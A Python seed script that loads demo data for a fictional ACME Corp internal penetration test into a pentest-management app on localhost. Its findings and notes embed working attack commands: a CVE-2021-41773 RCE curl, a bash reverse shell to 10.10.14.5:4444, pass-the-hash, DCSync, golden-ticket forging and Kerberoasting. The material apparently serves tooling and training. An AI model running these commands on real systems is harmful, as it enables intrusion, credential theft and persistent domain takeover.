#!/usr/bin/env python3
"""Demo seed — populates all tabs with realistic pentest data."""

import requests, sys, json
from datetime import datetime, timedelta

def ts(days_ago=0, hours_ago=0):
    dt = datetime.utcnow() - timedelta(days=days_ago, hours=hours_ago)
    return dt.strftime("%Y-%m-%dT%H:%M:%S")

BASE = "http://localhost:8000"
USERNAME = sys.argv[1] if len(sys.argv) > 1 else "admin"
PASSWORD = sys.argv[2] if len(sys.argv) > 2 else "admin"

s = requests.Session()

# ── auth ──────────────────────────────────────────────────────────────────────
r = s.post(f"{BASE}/api/auth/login", json={"username": USERNAME, "password": PASSWORD})
r.raise_for_status()
token = r.json()["access_token"]
s.headers["Authorization"] = f"Bearer {token}"
print(f"[+] Logged in as {USERNAME}")

def post(path, body):
    r = s.post(f"{BASE}{path}", json=body)
    if not r.ok:
        print(f"  [!] POST {path} → {r.status_code}: {r.text[:200]}")
        return None
    return r.json()

def patch(path, body):
    r = s.patch(f"{BASE}{path}", json=body)
    if not r.ok:
        print(f"  [!] PATCH {path} → {r.status_code}: {r.text[:200]}")
    return r.json()

# ── project ───────────────────────────────────────────────────────────────────
proj = post("/api/projects", {
    "name": "ACME Corp — Internal Pentest",
    "status": "active",
    "ip": "10.10.10.0/24",
    "os": "Mixed",
    "added": ts(10),
    "description": "Full-scope internal network penetration test. Objective: reach Domain Admin and capture all flags.",
})
pid = proj["id"]
print(f"[+] Project: {pid}")

# ── hosts ─────────────────────────────────────────────────────────────────────
hosts_data = [
    {"ip":"10.10.10.1",  "hostname":"fw01.acme.local",   "os":"Linux",   "status":"scanned",  "ports":["22","80","443","8443"],         "services":["ssh","http","https","https-alt"], "tags":["firewall","perimeter"], "notes":"Fortinet FortiGate. Web admin on 8443."},
    {"ip":"10.10.10.5",  "hostname":"dc01.acme.local",   "os":"Windows", "status":"pwned",    "ports":["53","88","135","389","445","3389","5985"], "services":["dns","kerberos","msrpc","ldap","smb","rdp","winrm"], "tags":["dc","ad","critical"], "notes":"Primary Domain Controller. DA obtained via DCSync."},
    {"ip":"10.10.10.10", "hostname":"web01.acme.local",  "os":"Linux",   "status":"owned",    "ports":["22","80","443","8080"],         "services":["ssh","http","https","http-proxy"], "tags":["web","dmz"], "notes":"Apache 2.4.49 — CVE-2021-41773 path traversal → RCE. Initial foothold."},
    {"ip":"10.10.10.15", "hostname":"sql01.acme.local",  "os":"Windows", "status":"owned",    "ports":["1433","3389","5985"],           "services":["mssql","rdp","winrm"], "tags":["database","internal"], "notes":"MSSQL 2019. SA account with blank password. xp_cmdshell enabled."},
    {"ip":"10.10.10.20", "hostname":"dev01.acme.local",  "os":"Windows", "status":"scanned",  "ports":["22","3389","8080","8443"],      "services":["ssh","rdp","http","https"], "tags":["dev","workstation"], "notes":"Developer workstation. Jenkins on 8080."},
    {"ip":"10.10.10.25", "hostname":"share01.acme.local","os":"Windows", "status":"scanned",  "ports":["445","135","139"],              "services":["smb","msrpc","netbios"], "tags":["fileshare"], "notes":"File server. Open shares: SYSVOL, backup$, IT-scripts."},
    {"ip":"10.10.10.30", "hostname":"vpn01.acme.local",  "os":"Linux",   "status":"scanned",  "ports":["1194","443","22"],              "services":["openvpn","https","ssh"], "tags":["vpn","perimeter"], "notes":"OpenVPN gateway. Default creds on web portal."},
    {"ip":"10.10.10.100","hostname":"ws-finance-01",     "os":"Windows", "status":"unknown",  "ports":["3389","445"],                  "services":["rdp","smb"], "tags":["workstation","finance"], "notes":"Finance dept workstation. Pass-the-hash successful."},
]
host_ids = {}
for h in hosts_data:
    res = post("/api/hosts", {**h, "pid": pid, "ips": [h["ip"]]})
    if res:
        host_ids[h["ip"]] = res["id"]
        print(f"  [+] Host {h['ip']} ({h['hostname']})")

# ── credentials ───────────────────────────────────────────────────────────────
creds_data = [
    {"username":"administrator", "secret":"Welcome1!",          "type":"plain",  "service":"smb",      "cracked":True,  "is_domain":True,  "notes":"Domain Admin. Reused across multiple systems."},
    {"username":"svc_backup",    "secret":"Backup@2023!",       "type":"plain",  "service":"winrm",    "cracked":True,  "is_domain":True,  "notes":"Service account. Found in backup script on share01."},
    {"username":"sa",            "secret":"",                   "type":"plain",  "service":"mssql",    "cracked":True,  "is_domain":False, "notes":"Blank SA password on sql01. Immediate xp_cmdshell."},
    {"username":"jsmith",        "secret":"aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c", "type":"ntlm", "service":"smb", "cracked":False, "is_domain":True, "notes":"Finance dept user. NTLM from secretsdump."},
    {"username":"admin",         "secret":"admin",              "type":"plain",  "service":"http",     "cracked":True,  "is_domain":False, "notes":"Default creds on FortiGate web admin (fw01)."},
    {"username":"jenkins",       "secret":"jenkins2024",        "type":"plain",  "service":"http",     "cracked":True,  "is_domain":False, "notes":"Jenkins local admin on dev01:8080."},
    {"username":"krbtgt",        "secret":"$krb5tgs$23$*krbtgt$ACME.LOCAL$krbtgt*$a3f8...", "type":"kerb", "service":"kerberos", "cracked":False, "is_domain":True, "notes":"Golden ticket material — DCSync output."},
    {"username":"svc_sql",       "secret":"P@ssw0rd123",        "type":"plain",  "service":"mssql",    "cracked":True,  "is_domain":True,  "notes":"SQL service account. Kerberoastable — cracked offline."},
    {"username":"vpnadmin",      "secret":"vpn@dmin!",          "type":"plain",  "service":"https",    "cracked":True,  "is_domain":False, "notes":"OpenVPN web portal default credentials."},
]
cred_ids = []
for c in creds_data:
    res = post("/api/creds", {**c, "pid": pid, "host": "", "host_ids": []})
    if res:
        cred_ids.append(res["id"])
        print(f"  [+] Cred {c['username']} / {c['service']}")

# ── findings ──────────────────────────────────────────────────────────────────
findings_data = [
    {
        "title": "Apache Path Traversal RCE (CVE-2021-41773)",
        "severity": "critical", "cvss": "9.8", "cve": "CVE-2021-41773",
        "host_id": host_ids.get("10.10.10.10"),
        "description": "Apache HTTP Server 2.4.49 is vulnerable to path traversal and remote code execution. An attacker can map URLs to files outside the document root and execute CGI scripts.",
        "proof": "$ curl 'http://10.10.10.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'echo Content-Type: text/plain; echo; id'\nuid=daemon(daemon) gid=daemon(daemon) groups=daemon(daemon)",
        "recommendation": "Upgrade Apache to 2.4.51 or later. Disable mod_cgi if not required. Restrict access to /cgi-bin/.",
        "status": "confirmed",
    },
    {
        "title": "MSSQL SA Account with Blank Password",
        "severity": "critical", "cvss": "9.0", "cve": "",
        "host_id": host_ids.get("10.10.10.15"),
        "description": "The MSSQL Server Administrator (SA) account has an empty password, allowing unauthenticated access with full database privileges. xp_cmdshell was enabled to achieve OS command execution.",
        "proof": "mssqlclient.py sa:@10.10.10.15\n[*] Encryption required, switching to TLS\nSQL> xp_cmdshell whoami\noutput: nt authority\\system",
        "recommendation": "Set a strong password on the SA account. Disable SA if possible. Disable xp_cmdshell. Enable SQL Server Audit.",
        "status": "confirmed",
    },
    {
        "title": "Domain Admin via DCSync (Pass-the-Hash)",
        "severity": "critical", "cvss": "9.0", "cve": "",
        "host_id": host_ids.get("10.10.10.5"),
        "description": "After obtaining NTLM hash of svc_backup via Secretsdump, attacker performed Pass-the-Hash to authenticate as Domain Admin and executed DCSync to dump all domain credentials.",
        "proof": "secretsdump.py -just-dc acme.local/administrator:Welcome1!@10.10.10.5\n[+] Dumping Domain Credentials (NTDS.dit)\nACME.LOCAL\\Administrator:500:aad3b435b51404ee:8846f7eaee8fb117...",
        "recommendation": "Enable Protected Users group for all privileged accounts. Deploy Credential Guard. Enforce LAPS. Tier the admin model.",
        "status": "confirmed",
    },
    {
        "title": "Kerberoasting — Weak Service Account Password",
        "severity": "high", "cvss": "7.5", "cve": "",
        "host_id": host_ids.get("10.10.10.5"),
        "description": "Service account svc_sql has a Kerberoastable SPN. The TGS ticket was retrieved and cracked offline in under 2 hours using a standard wordlist.",
        "proof": "GetUserSPNs.py -request acme.local/jsmith:Password1 -dc-ip 10.10.10.5\n$krb5tgs$23$*svc_sql$ACME.LOCAL...\nhashcat -m 13100 hash.txt rockyou.txt → P@ssw0rd123",
        "recommendation": "Use MSA/gMSA for service accounts. Enforce password length >25 chars for kerberoastable accounts. Monitor event 4769.",
        "status": "confirmed",
    },
    {
        "title": "SMB Signing Disabled — Relay Attack Possible",
        "severity": "high", "cvss": "7.1", "cve": "",
        "host_id": host_ids.get("10.10.10.25"),
        "description": "SMB signing is not enforced on multiple hosts. This allows NTLM relay attacks — attacker can relay authentication from one host to another to gain unauthorized access.",
        "proof": "nmap --script smb2-security-mode -p445 10.10.10.0/24\n10.10.10.25: Message signing enabled but not required\n\nresponder -I eth0 -rdwv\nntmlrelayx.py -smb2support -t 10.10.10.15",
        "recommendation": "Enable and require SMB signing via GPO: Network Security: Digitally sign communications (always). Deploy SMB3 with encryption.",
        "status": "open",
    },
    {
        "title": "Default Credentials on FortiGate Admin Portal",
        "severity": "high", "cvss": "7.2", "cve": "",
        "host_id": host_ids.get("10.10.10.1"),
        "description": "The FortiGate firewall web administration interface accepts default credentials (admin/admin). An attacker with network access can gain full firewall control.",
        "proof": "curl -k -X POST https://10.10.10.1:8443/logincheck -d 'username=admin&secretkey=admin'\nSet-Cookie: APSCOOKIE=...; expires=...",
        "recommendation": "Change all default credentials immediately. Enable MFA on the admin portal. Restrict management access to dedicated management network only.",
        "status": "confirmed",
    },
    {
        "title": "Sensitive Data in Open SMB Share (backup$)",
        "severity": "medium", "cvss": "5.5", "cve": "",
        "host_id": host_ids.get("10.10.10.25"),
        "description": "The backup$ share on the file server is accessible to all domain users and contains backup scripts with hardcoded credentials and configuration files with database passwords.",
        "proof": "smbclient //10.10.10.25/backup$ -U 'acme.local/jsmith%Password1'\nsmb: \\> ls\n  backup_scripts/  D  0  Mon Jan  8 12:00:00 2024\n  db_config.xml    A  4096  ...\n<password>Backup@2023!</password>",
        "recommendation": "Remove sensitive data from open shares. Apply least-privilege ACLs. Audit share permissions regularly. Use a secrets manager.",
        "status": "open",
    },
    {
        "title": "Jenkins Unauthenticated Script Console",
        "severity": "medium", "cvss": "6.3", "cve": "",
        "host_id": host_ids.get("10.10.10.20"),
        "description": "Jenkins instance on dev01:8080 has weak credentials and the Groovy script console is accessible. This allows arbitrary code execution as the Jenkins service user.",
        "proof": "# POST to http://10.10.10.20:8080/script\n\"cmd /c whoami\".execute().text\n→ acme\\svc_jenkins",
        "recommendation": "Enforce strong authentication. Disable script console in production. Upgrade Jenkins. Place behind corporate SSO.",
        "status": "open",
    },
    {
        "title": "Outdated OpenVPN Version with Known CVEs",
        "severity": "low", "cvss": "3.7", "cve": "CVE-2023-46849",
        "host_id": host_ids.get("10.10.10.30"),
        "description": "The OpenVPN server is running version 2.6.6 which is affected by CVE-2023-46849 (division by zero DoS). While not directly exploitable for code execution, it may cause service disruption.",
        "proof": "openvpn --version\nOpenVPN 2.6.6 x86_64-pc-linux-gnu",
        "recommendation": "Upgrade OpenVPN to 2.6.8 or later. Apply vendor security patches promptly.",
        "status": "open",
    },
]
finding_ids = []
for i, f in enumerate(findings_data):
    res = post("/api/findings", {**f, "pid": pid, "ts": ts(days_ago=8, hours_ago=i)})
    if res:
        finding_ids.append(res["id"])
        print(f"  [+] Finding [{f['severity'].upper()}] {f['title'][:60]}")

# ── notes ─────────────────────────────────────────────────────────────────────
notes_data = [
    {
        "title": "Recon — Network Discovery",
        "phase": "recon",
        "tags": ["nmap", "recon", "discovery"],
        "starred": True,
        "content": """# Network Discovery

## Scope
- **Target range:** 10.10.10.0/24
- **Engagement:** Internal pentest, full-scope

## Nmap Results

```bash
nmap -sV -sC -T4 -oA full_scan 10.10.10.0/24
```

### Live Hosts (8 found)
| IP | Hostname | OS | Key Ports |
|---|---|---|---|
| 10.10.10.1 | fw01.acme.local | Linux | 22,80,443,8443 |
| 10.10.10.5 | dc01.acme.local | Windows | 53,88,389,445,3389 |
| 10.10.10.10 | web01.acme.local | Linux | 22,80,443 |
| 10.10.10.15 | sql01.acme.local | Windows | 1433,3389 |

## DNS Enum
```bash
dig axfr acme.local @10.10.10.5
;; Transfer failed — zone transfer restricted
```

## LDAP Enum
```bash
ldapsearch -x -H ldap://10.10.10.5 -b "dc=acme,dc=local"
# 247 users found, 34 groups
```
""",
    },
    {
        "title": "Initial Access — Apache CVE-2021-41773",
        "phase": "exploitation",
        "tags": ["apache", "rce", "cve-2021-41773", "initial-access"],
        "starred": True,
        "content": """# Initial Access via Apache Path Traversal

## Vulnerability
**CVE-2021-41773** — Apache HTTP Server 2.4.49 path traversal + RCE via mod_cgi.

## Exploitation

```bash
# Verify version
curl -I http://10.10.10.10/
# Server: Apache/2.4.49 (Unix)

# Test path traversal
curl 'http://10.10.10.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

# RCE via mod_cgi
curl 'http://10.10.10.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \\
  --data 'echo Content-Type: text/plain; echo; id'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

## Reverse Shell
```bash
# Listener
nc -lvnp 4444

# Payload
curl 'http://10.10.10.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \\
  --data 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

## Post-Exploitation
```bash
whoami → daemon
uname -a → Linux web01 5.15.0-91-generic
cat /etc/shadow → readable!
find / -perm -4000 2>/dev/null  # SUID search
```

> **Next step:** Privesc to root, pivot to internal network
""",
    },
    {
        "title": "Lateral Movement — Pass-the-Hash",
        "phase": "post-exploitation",
        "tags": ["pth", "smb", "lateral-movement", "windows"],
        "starred": False,
        "content": """# Lateral Movement — Pass-the-Hash

## Setup
After obtaining NTLM hashes from web01 /etc/shadow and sql01 Secretsdump:

## Technique
```bash
# Dump local SAM via secretsdump
secretsdump.py -sam sam.save -system system.save LOCAL
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# PTH with psexec
psexec.py -hashes aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \\
  administrator@10.10.10.15

# PTH with wmiexec (quieter)
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c \\
  administrator@10.10.10.15 "whoami"
nt authority\\system
```

## Results
| Target | Method | Result |
|---|---|---|
| 10.10.10.15 (sql01) | psexec PTH | SYSTEM shell |
| 10.10.10.5 (dc01) | wmiexec PTH | Domain Admin |
| 10.10.10.25 (share01) | smbclient PTH | Full share access |

## OPSEC Notes
- psexec creates a service — noisy (EventID 7045)
- wmiexec is quieter but still logged (EventID 4688)
- Prefer winrm / evil-winrm for interactive sessions
""",
    },
    {
        "title": "Privilege Escalation — Domain Admin via DCSync",
        "phase": "post-exploitation",
        "tags": ["dcsync", "domain-admin", "privesc", "ad"],
        "starred": True,
        "content": """# Domain Admin — DCSync

## Context
With DA privileges on dc01, performed DCSync to dump all domain hashes.

## DCSync
```bash
secretsdump.py -just-dc acme.local/administrator:'Welcome1!'@10.10.10.5

[*] Dumping Domain Credentials (NTDS.dit)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
krbtgt:502:aad3b435b51404ee:cd06be9b870be30e05f585c01fefb56e:::
svc_backup:1103:aad3b435b51404ee:3d7e4a5a88e9e876a82a18ce29dd4fb3:::
jsmith:1104:aad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f6d4...
```

## Golden Ticket
```bash
ticketer.py -nthash cd06be9b870be30e05f585c01fefb56e \\
  -domain-sid S-1-5-21-... -domain acme.local administrator

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass dc01.acme.local
```

## Impact
- **Full domain compromise**
- All 247 user accounts exposed
- Persistent access via golden ticket (valid 10 years by default)
""",
    },
    {
        "title": "Kerberoasting Walkthrough",
        "phase": "exploitation",
        "tags": ["kerberoast", "ad", "password-cracking"],
        "starred": False,
        "content": """# Kerberoasting

## Enumerate SPNs
```bash
GetUserSPNs.py acme.local/jsmith:Password1 -dc-ip 10.10.10.5 -request

ServicePrincipalName    Name     MemberOf  PasswordLastSet
----------------------  -------  --------  ---------------
MSSQLSvc/sql01:1433     svc_sql  <none>    2023-03-15
```

## Crack the Ticket
```bash
hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt
  --rules /usr/share/hashcat/rules/best64.rule

$krb5tgs$23$*svc_sql$ACME.LOCAL*... → P@ssw0rd123
```

## Result
- `svc_sql` cracked → `P@ssw0rd123`
- Account has local admin on sql01
- Used for second path to sql01 compromise
""",
    },
]
note_ids = []
for i, n in enumerate(notes_data):
    res = post("/api/notes", {**n, "pid": pid, "ts": ts(days_ago=9-i)})
    if res:
        note_ids.append(res["id"])
        print(f"  [+] Note: {n['title']}")

# ── scope ─────────────────────────────────────────────────────────────────────
scopes = [
    {"value": "10.10.10.0/24",    "scope_type": "cidr",   "in_scope": True,  "description": "Primary internal network"},
    {"value": "10.10.20.0/24",    "scope_type": "cidr",   "in_scope": True,  "description": "Secondary VLAN — DR site"},
    {"value": "acme.local",        "scope_type": "domain", "in_scope": True,  "description": "Active Directory domain"},
    {"value": "acme-ext.com",      "scope_type": "domain", "in_scope": True,  "description": "External facing web properties"},
    {"value": "192.168.99.0/24",   "scope_type": "cidr",   "in_scope": False, "description": "Production payment systems — OUT OF SCOPE"},
    {"value": "10.10.10.200",      "scope_type": "ip",     "in_scope": False, "description": "CEO workstation — explicitly excluded"},
    {"value": "mail.acme.com",     "scope_type": "domain", "in_scope": True,  "description": "Exchange mail server"},
    {"value": "vpn.acme-ext.com",  "scope_type": "domain", "in_scope": True,  "description": "VPN gateway external hostname"},
]
for sc in scopes:
    post("/api/scopes", {**sc, "pid": pid})
print(f"[+] Scopes: {len(scopes)}")

# ── checklist ─────────────────────────────────────────────────────────────────
checklist = [
    # Recon
    {"phase": "recon", "text": "Run full port scan (nmap -sV -sC -T4)",             "done": True,  "order_idx": 0},
    {"phase": "recon", "text": "Enumerate DNS (dig, fierce, dnsx)",                  "done": True,  "order_idx": 1},
    {"phase": "recon", "text": "LDAP enumeration (users, groups, GPOs)",             "done": True,  "order_idx": 2},
    {"phase": "recon", "text": "Enumerate SMB shares (smbmap, crackmapexec)",        "done": True,  "order_idx": 3},
    {"phase": "recon", "text": "Check for anonymous access (FTP, SMB, LDAP)",        "done": True,  "order_idx": 4},
    {"phase": "recon", "text": "Run BloodHound / SharpHound collection",             "done": False, "order_idx": 5},
    # Exploitation
    {"phase": "exploitation", "text": "Test web apps for OWASP Top 10",              "done": True,  "order_idx": 0},
    {"phase": "exploitation", "text": "Check default credentials on all services",   "done": True,  "order_idx": 1},
    {"phase": "exploitation", "text": "Run Kerberoasting",                           "done": True,  "order_idx": 2},
    {"phase": "exploitation", "text": "AS-REP Roasting (no preauth users)",          "done": False, "order_idx": 3},
    {"phase": "exploitation", "text": "Password spray (careful — lockout policy!)",  "done": False, "order_idx": 4},
    {"phase": "exploitation", "text": "Check for PrintNightmare / PetitPotam",       "done": False, "order_idx": 5},
    # Post-exploitation
    {"phase": "post-exploitation", "text": "Dump SAM / LSASS on owned hosts",        "done": True,  "order_idx": 0},
    {"phase": "post-exploitation", "text": "DCSync from DC",                         "done": True,  "order_idx": 1},
    {"phase": "post-exploitation", "text": "Forge golden ticket",                    "done": True,  "order_idx": 2},
    {"phase": "post-exploitation", "text": "Enumerate all reachable subnets",        "done": False, "order_idx": 3},
    {"phase": "post-exploitation", "text": "Collect all flags / objectives",         "done": False, "order_idx": 4},
    # Reporting
    {"phase": "reporting", "text": "Screenshot all critical findings",               "done": False, "order_idx": 0},
    {"phase": "reporting", "text": "Validate all CVSSv3 scores",                     "done": False, "order_idx": 1},
    {"phase": "reporting", "text": "Write executive summary",                        "done": False, "order_idx": 2},
    {"phase": "reporting", "text": "Peer review report",                             "done": False, "order_idx": 3},
]
post("/api/checklist", [{"pid": pid, **c} for c in checklist])
print(f"[+] Checklist: {len(checklist)} items")

# ── objectives / flags ────────────────────────────────────────────────────────
objectives = [
    {
        "title": "Domain Admin",
        "description": "Obtain Domain Administrator privileges on ACME.LOCAL",
        "category": "objective",
        "points": 100,
        "status": "captured",
        "flag_value": "FLAG{d0m41n_4dm1n_0wn3d}",
        "captured_by": "operator1",
        "captured_at": "2024-01-15T14:32:00",
        "host_id": host_ids.get("10.10.10.5"),
    },
    {
        "title": "Initial Foothold",
        "description": "Gain shell access on any target system",
        "category": "flag",
        "points": 25,
        "status": "captured",
        "flag_value": "FLAG{4p4ch3_p4th_tr4v3rs4l}",
        "captured_by": "operator1",
        "captured_at": "2024-01-15T09:15:00",
        "host_id": host_ids.get("10.10.10.10"),
    },
    {
        "title": "Database Server Access",
        "description": "Gain OS-level access on the MSSQL database server",
        "category": "flag",
        "points": 50,
        "status": "captured",
        "flag_value": "FLAG{sql_bl4nk_p4ssw0rd}",
        "captured_by": "operator1",
        "captured_at": "2024-01-15T11:00:00",
        "host_id": host_ids.get("10.10.10.15"),
    },
    {
        "title": "Exfiltrate Finance Data",
        "description": "Access and exfiltrate data from finance department share",
        "category": "bas",
        "points": 75,
        "status": "in_progress",
        "flag_value": "",
        "captured_by": "",
        "captured_at": "",
        "host_id": host_ids.get("10.10.10.25"),
    },
    {
        "title": "Compromise Backup System",
        "description": "Gain access to backup infrastructure",
        "category": "objective",
        "points": 50,
        "status": "not_started",
        "flag_value": "",
        "captured_by": "",
        "captured_at": "",
        "host_id": None,
    },
]
for o in objectives:
    res = post("/api/objectives", {**o, "pid": pid})
    if res:
        print(f"  [+] Objective: {o['title']} [{o['status']}]")

# ── attack path ───────────────────────────────────────────────────────────────
path = post("/api/attack-paths", {"pid": pid, "name": "Domain Compromise", "description": "Full kill chain from initial access to Domain Admin"})
if path:
    path_id = path["id"]
    steps = [
        {"step_order":0, "node_type":"internet",  "label":"Attacker",           "sublabel":"Kali Linux",      "technique":"",                              "notes":""},
        {"step_order":1, "node_type":"host",       "label":"web01.acme.local",   "sublabel":"10.10.10.10",     "technique":"CVE-2021-41773 Path Traversal",  "notes":"Apache 2.4.49 RCE via mod_cgi. Initial foothold as daemon user."},
        {"step_order":2, "node_type":"host",       "label":"web01 → root",       "sublabel":"Local privesc",   "technique":"SUID binary abuse (find)",        "notes":"find / -perm -4000 → /usr/bin/find → sudo shell"},
        {"step_order":3, "node_type":"host",       "label":"sql01.acme.local",   "sublabel":"10.10.10.15",     "technique":"Pass-the-Hash (NTLM)",            "notes":"Reused admin hash from web01 SAM dump → SYSTEM on sql01"},
        {"step_order":4, "node_type":"host",       "label":"share01.acme.local", "sublabel":"10.10.10.25",     "technique":"Credential in file (backup$)",    "notes":"Found svc_backup plaintext password in backup script"},
        {"step_order":5, "node_type":"host",       "label":"dc01.acme.local",    "sublabel":"10.10.10.5",      "technique":"Pass-the-Hash → DA",              "notes":"svc_backup hash → winrm → DA via token impersonation"},
        {"step_order":6, "node_type":"target",     "label":"Domain Admin",       "sublabel":"ACME.LOCAL",      "technique":"DCSync — full domain dump",        "notes":"All 247 NTLM hashes. Golden ticket forged."},
    ]
    for st in steps:
        post("/api/attack-steps", {**st, "path_id": path_id, "pid": pid, "mitre_id": ""})
    print(f"[+] Attack path: {len(steps)} steps")

# ── loot ─────────────────────────────────────────────────────────────────────
loots = [
    {"loot_type":"file",   "value":"/etc/shadow",                           "source_path":"web01:/etc/shadow",          "description":"Linux shadow file from web01. 8 hashes."},
    {"loot_type":"file",   "value":"NTDS.dit + SYSTEM",                     "source_path":"dc01:C:\\Windows\\NTDS\\",   "description":"Full AD database. 247 accounts."},
    {"loot_type":"file",   "value":"backup_db.sql",                         "source_path":"share01:\\backup$\\sql\\",   "description":"SQL Server backup with customer PII."},
    {"loot_type":"hash",   "value":"administrator:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c", "source_path":"dc01 secretsdump", "description":"Domain Administrator NTLM hash"},
    {"loot_type":"hash",   "value":"krbtgt:cd06be9b870be30e05f585c01fefb56e","source_path":"dc01 secretsdump",          "description":"krbtgt hash — golden ticket material"},
    {"loot_type":"secret", "value":"Backup@2023!",                          "source_path":"share01:\\backup$\\scripts\\backup.bat", "description":"svc_backup plaintext password in batch script"},
    {"loot_type":"file",   "value":"web.config (connection strings)",        "source_path":"web01:/var/www/html/",       "description":"DB connection string with SQL SA credentials"},
    {"loot_type":"secret", "value":"FLAG{d0m41n_4dm1n_0wn3d}",             "source_path":"dc01 Desktop\\flag.txt",     "description":"Domain Admin flag"},
    {"loot_type":"secret", "value":"FLAG{4p4ch3_p4th_tr4v3rs4l}",          "source_path":"web01:/var/www/flag.txt",    "description":"Initial access flag"},
    {"loot_type":"file",   "value":"id_rsa (root)",                         "source_path":"web01:/root/.ssh/id_rsa",    "description":"Root SSH private key from web01"},
]
for l in loots:
    host_id_map = {
        "web01": host_ids.get("10.10.10.10"),
        "dc01":  host_ids.get("10.10.10.5"),
        "sql01": host_ids.get("10.10.10.15"),
        "share01": host_ids.get("10.10.10.25"),
    }
    hid = next((v for k, v in host_id_map.items() if k in l.get("source_path","")), None)
    res = post("/api/loots", {**l, "pid": pid, "host_id": hid, "ts": ts(days_ago=5)})
    if res:
        print(f"  [+] Loot: {l['loot_type']} — {l['description'][:50]}")

# ── network map ───────────────────────────────────────────────────────────────
dc_hid   = host_ids.get("10.10.10.5")
web_hid  = host_ids.get("10.10.10.10")
sql_hid  = host_ids.get("10.10.10.15")
fw_hid   = host_ids.get("10.10.10.1")
share_hid= host_ids.get("10.10.10.25")
dev_hid  = host_ids.get("10.10.10.20")
vpn_hid  = host_ids.get("10.10.10.30")

network = post("/api/networks", {
    "pid": pid,
    "name": "ACME Corp Network",
    "background": "#07080b",
    "regions_json": [
        {"id":"r1","x":40,"y":40,"w":340,"h":260,"label":"DMZ","note":"Internet-facing segment","fill":"#5b8af522","stroke":"#5b8af5","strokeWidth":2},
        {"id":"r2","x":440,"y":40,"w":400,"h":260,"label":"Internal LAN","note":"Core internal network","fill":"#39d35314","stroke":"#39d353","strokeWidth":2},
        {"id":"r3","x":440,"y":340,"w":400,"h":200,"label":"Server VLAN","note":"Database & file servers","fill":"#e8574a14","stroke":"#e8574a","strokeWidth":2},
        {"id":"r4","x":40,"y":340,"w":340,"h":200,"label":"Management","note":"Admin & monitoring","fill":"#f09a3a14","stroke":"#f09a3a","strokeWidth":2},
    ],
    "nodes_json": [
        {"id":"n1","x":80, "y":120,"label":"fw01","sublabel":"10.10.10.1","type":"router",  "status":"scanned","host_id":fw_hid,   "ips":["10.10.10.1"], "ports":["22","80","443","8443"],"services":["ssh","http","https"],"notes":"FortiGate — default creds"},
        {"id":"n2","x":200,"y":160,"label":"web01","sublabel":"10.10.10.10","type":"server","status":"owned",  "host_id":web_hid,  "ips":["10.10.10.10"],"ports":["22","80","443"],       "services":["ssh","http","https"],"notes":"Apache CVE-2021-41773 — initial foothold"},
        {"id":"n3","x":200,"y":80, "label":"vpn01","sublabel":"10.10.10.30","type":"server","status":"scanned","host_id":vpn_hid,  "ips":["10.10.10.30"],"ports":["1194","443"],          "services":["openvpn","https"],  "notes":"OpenVPN GW"},
        {"id":"n4","x":560,"y":100,"label":"dc01", "sublabel":"10.10.10.5", "type":"server","status":"pwned",  "host_id":dc_hid,   "ips":["10.10.10.5"], "ports":["53","88","389","445"], "services":["dns","kerberos","ldap","smb"],"notes":"★ Domain Controller — PWNED"},
        {"id":"n5","x":720,"y":100,"label":"dev01","sublabel":"10.10.10.20","type":"workstation","status":"scanned","host_id":dev_hid,"ips":["10.10.10.20"],"ports":["3389","8080"],     "services":["rdp","jenkins"],    "notes":"Jenkins on 8080"},
        {"id":"n6","x":560,"y":400,"label":"sql01","sublabel":"10.10.10.15","type":"server","status":"owned",  "host_id":sql_hid,  "ips":["10.10.10.15"],"ports":["1433","3389"],        "services":["mssql","rdp"],      "notes":"SA blank password → SYSTEM"},
        {"id":"n7","x":720,"y":400,"label":"share01","sublabel":"10.10.10.25","type":"server","status":"scanned","host_id":share_hid,"ips":["10.10.10.25"],"ports":["445","139"],       "services":["smb","netbios"],    "notes":"Exposed backup$ share"},
        {"id":"n8","x":120,"y":400,"label":"mgmt-kali","sublabel":"10.10.14.5","type":"workstation","status":"unknown","host_id":None,"ips":["10.10.14.5"],"ports":[],                  "services":[],                   "notes":"Attacker machine"},
    ],
    "edges_json": [
        {"id":"e1","from":"n8","to":"n1","label":"probe"},
        {"id":"e2","from":"n1","to":"n2","label":"80/443"},
        {"id":"e3","from":"n1","to":"n3","label":"1194"},
        {"id":"e4","from":"n2","to":"n4","label":"445 PTH"},
        {"id":"e5","from":"n2","to":"n6","label":"PTH → SYSTEM"},
        {"id":"e6","from":"n6","to":"n7","label":"SMB"},
        {"id":"e7","from":"n4","to":"n5","label":"domain"},
        {"id":"e8","from":"n8","to":"n2","label":"exploit"},
    ],
})
if network:
    print(f"[+] Network map created")

# ── done ─────────────────────────────────────────────────────────────────────
print(f"""
╔══════════════════════════════════════════════════════╗
║  Demo data loaded successfully!                      ║
╠══════════════════════════════════════════════════════╣
║  Project : ACME Corp — Internal Pentest              ║
║  Hosts   : {len(hosts_data)} (incl. DC, web, sql, fw, vpn)            ║
║  Creds   : {len(creds_data)} (plain, NTLM, Kerberos)                  ║
║  Findings: {len(findings_data)} (critical → low)                      ║
║  Notes   : {len(notes_data)} (recon → post-ex)                        ║
║  Loot    : {len(loots)} items (files, hashes, secrets)              ║
║  Checklist: {len(checklist)} items across 4 phases                   ║
║  Scope   : {len(scopes)} entries (in/out of scope)                  ║
